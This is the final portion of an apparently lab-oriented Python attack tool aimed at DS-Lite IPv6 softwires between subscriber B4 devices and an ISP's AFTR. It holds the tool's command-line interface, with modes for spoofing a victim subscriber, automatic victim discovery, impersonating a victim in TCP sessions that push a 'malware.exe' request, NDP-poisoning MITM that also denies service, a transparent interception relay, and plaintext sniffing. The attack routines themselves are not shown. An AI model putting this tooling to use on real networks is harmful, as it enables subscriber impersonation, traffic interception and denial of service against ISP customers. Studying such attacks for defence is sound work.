    print("  NOTE: this userspace relay is LOSSY - prefer --kernel for a stable MITM.")
    print("  To READ the intercepted traffic, run the T4 sniff mode alongside this.")
    return 0


# ── main ──────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="T3 Softwire Endpoint Spoofing & On-Path MITM / T4 Unencrypted-Tunnel Interception\n"
                    "Operates on the IPv6 ISP network segment between B4 and AFTR.",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sub = p.add_subparsers(dest='mode', required=True)

    # ── spoof sub-command ──────────────────────────────────────────────
    sp = sub.add_parser('spoof',
        help='T3: Forge victim B4 IPv6 src to impersonate subscriber')
    sp.add_argument('--interface', required=True,
                    help='Network interface on ISP segment (e.g. eth-isp)')
    sp.add_argument('--src-ip6', required=True,
                    help="Attacker's real IPv6 (for NDP resolution only)")
    sp.add_argument('--victim-b4-ip6', default=None,
                    help="Victim B4's IPv6 to impersonate. Omit (or use --discover) "
                         "to auto-discover one via carrier reconnaissance.")
    sp.add_argument('--discover', action='store_true',
                    help='Reconnaissance: find a victim B4 (passive sniff -> '
                         'predictable guess -> active NDP probe) instead of '
                         'requiring --victim-b4-ip6 in advance.')
    sp.add_argument('--recon-timeout', type=int, default=8,
                    help='Passive-listen window for --discover (default: 8s)')
    sp.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                    help='AFTR IPv6 address (default: 2001:db8:cafe::10)')
    sp.add_argument('--inner-src-ip4', default='10.0.1.50',
                    help='Inner IPv4 source in forged tunnel (default: 10.0.1.50)')
    sp.add_argument('--inner-dst-ip4', default='198.51.100.2',
                    help='Inner IPv4 destination (default: 198.51.100.2)')
    sp.add_argument('--proto', choices=['tcp', 'udp', 'icmp'], default='udp',
                    help='Inner transport protocol (default: udp)')
    sp.add_argument('--count', type=int, default=0,
                    help='Number of spoofed packets (0=unlimited, default: 0)')
    sp.add_argument('--batch', type=int, default=64,
                    help='Packets per batch (default: 64)')
    sp.add_argument('--interval', type=float, default=0,
                    help='Seconds between batches (0=no delay, default: 0)')
    sp.add_argument('--focused', action='store_true',
                    help='Impersonation demo (not exhaustion): one fixed forged '
                         'flow (fixed inner IP + dst port) so the AFTR reply is '
                         'visibly returned to the VICTIM B4, not the attacker.')
    sp.add_argument('--dst-port', type=int, default=9999,
                    help='Fixed dst port for --focused (use an OPEN port like the '
                         '9999 reflector so the reply is observable; default 9999)')
    sp.add_argument('--focus-sport', type=int, default=40000,
                    help='Fixed inner source port for --focused (default 40000)')

    # ── impersonate sub-command (developed T3) ─────────────────────────
    im = sub.add_parser('impersonate',
        help='T3+: open a real bidirectional TCP session AS the victim B4 '
             '(forge to send, sniff AFTR return to receive) and push abuse')
    im.add_argument('--interface', required=True, help='ISP segment interface')
    im.add_argument('--src-ip6', required=True,
                    help="Attacker's real IPv6 (for recon / NDP only)")
    im.add_argument('--victim-b4-ip6', default=None,
                    help='Victim B4 to impersonate (omit / --discover to find one)')
    im.add_argument('--discover', action='store_true',
                    help='Recon (passive->guess->active) to find a victim B4')
    im.add_argument('--recon-timeout', type=int, default=8)
    im.add_argument('--aftr-ip6', default='2001:db8:cafe::10')
    im.add_argument('--inner-src-ip4', default='10.0.1.88',
                    help='Inner IPv4 to use inside the forged session')
    im.add_argument('--inner-dst-ip4', default='198.51.100.2',
                    help='Session destination (the server reached as the victim)')
    im.add_argument('--target-port', type=int, default=80)
    im.add_argument('--abuse-path', default='malware.exe',
                    help='Path in the framing HTTP request (default: malware.exe)')

    # ── mitm sub-command (developed T3) ─────────────────────────────────
    mm = sub.add_parser('mitm',
        help='T3++: true MITM via sustained NDP poison - intercept the AFTR '
             'return path for a victim B4 (also DoSes the victim)')
    mm.add_argument('--interface', required=True, help='ISP segment interface')
    mm.add_argument('--src-ip6', required=True,
                    help="Attacker's real IPv6 (for recon / NDP only)")
    mm.add_argument('--victim-b4-ip6', default=None,
                    help='Victim B4 to intercept (omit / --discover to find one)')
    mm.add_argument('--discover', action='store_true',
                    help='Recon (passive->guess->active) to find a victim B4')
    mm.add_argument('--recon-timeout', type=int, default=8)
    mm.add_argument('--aftr-ip6', default='2001:db8:cafe::10')
    mm.add_argument('--duration', type=int, default=20,
                    help='Seconds to hold the MITM / poison flood (default: 20)')
    mm.add_argument('--interval', type=float, default=0.05,
                    help='Seconds between override NAs (default: 0.05)')
    mm.add_argument('--show-intercept', action='store_true',
                    help='Count the AFTR->victim return frames redirected to us')

    # ── relay sub-command (full MITM: poison both ways + forward) ───────
    rl = sub.add_parser('relay',
        help='T3 full MITM: poison BOTH softwire directions and FORWARD frames '
             'so the victim still works (200) while the attacker reads the cleartext')
    rl.add_argument('--interface', required=True, help='ISP segment interface')
    rl.add_argument('--src-ip6', required=True, help="Attacker's real IPv6 (NDP only)")
    rl.add_argument('--victim-b4-ip6', required=True, help='Victim B4 to relay for')
    rl.add_argument('--aftr-ip6', default='2001:db8:cafe::10')
    rl.add_argument('--duration', type=int, default=20,
                    help='Seconds to hold the MITM relay (default: 20)')
    rl.add_argument('--interval', type=float, default=0.05,
                    help='Seconds between override NAs (default: 0.05)')
    rl.add_argument('--down-only', action='store_true',
                    help='Poison/relay only the AFTR return path; leave the '
                         'upstream native (more robust, reads server responses)')
    rl.add_argument('--kernel', action='store_true',
                    help='Full transparent MITM: poison BOTH sides and let the '
                         'attacker KERNEL forward at line rate (stable; victim '
                         'stays served). Needs forwarding + static-neigh privilege.')

    # ── sniff sub-command ──────────────────────────────────────────────
    sn = sub.add_parser('sniff',
        help='T4: Passively capture all softwire traffic in plaintext')
    sn.add_argument('--interface', required=True,
                    help='Network interface on ISP segment (e.g. eth-isp)')
    sn.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                    help='AFTR IPv6 address to filter on (default: 2001:db8:cafe::10)')
    sn.add_argument('--output-pcap',
                    help='Save captured packets to pcap file')
    sn.add_argument('--duration', type=int, default=0,
                    help='Capture duration in seconds (0=until Ctrl+C, default: 0)')

    args = p.parse_args()

    if args.mode == 'spoof':
        # victim-b4-ip6 may be None when --discover (or no victim) is used; recon
        # fills it inside run_spoof, so only validate it if it was supplied.
        checks = [(args.aftr_ip6, 'aftr-ip6'), (args.src_ip6, 'src-ip6')]
        if args.victim_b4_ip6:
            checks.insert(0, (args.victim_b4_ip6, 'victim-b4-ip6'))
        for ip, label in checks:
            if not is_valid_ipv6(ip):
                p.error(f'Invalid {label}: {ip}')
        if not is_valid_ipv4(args.inner_src_ip4):
            p.error(f'Invalid inner-src-ip4: {args.inner_src_ip4}')
        if not is_valid_ipv4(args.inner_dst_ip4):
            p.error(f'Invalid inner-dst-ip4: {args.inner_dst_ip4}')
        run_spoof(args)
    elif args.mode == 'impersonate':
        sys.exit(run_impersonate(args))
    elif args.mode == 'mitm':
        # Discover a victim if none supplied (reuse the recon ladder).
        if args.discover or not args.victim_b4_ip6:
            sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            try:
                import recon as _recon
                r = _recon.discover(args.interface, args.src_ip6, args.aftr_ip6,
                                    passive_timeout=args.recon_timeout)
            except Exception as e:
                print(f"[!] recon failed: {e}"); r = None
            if not r:
                p.error('recon found no victim B4; supply --victim-b4-ip6')
            args.victim_b4_ip6 = r["victim_b4"]
            args.aftr_ip6 = r.get("aftr") or args.aftr_ip6
            print(f"[*] Recon picked victim B4 {args.victim_b4_ip6} via {r['method']}")
        sys.exit(run_mitm(args))
    elif args.mode == 'relay':
        for ip, label in [(args.aftr_ip6, 'aftr-ip6'), (args.src_ip6, 'src-ip6'),
                          (args.victim_b4_ip6, 'victim-b4-ip6')]:
            if not is_valid_ipv6(ip):
                p.error(f'Invalid {label}: {ip}')
        sys.exit(run_relay(args))
    else:
        if args.aftr_ip6 and not is_valid_ipv6(args.aftr_ip6):
            p.error(f'Invalid aftr-ip6: {args.aftr_ip6}')
        run_sniff(args)


if __name__ == '__main__':
    main()
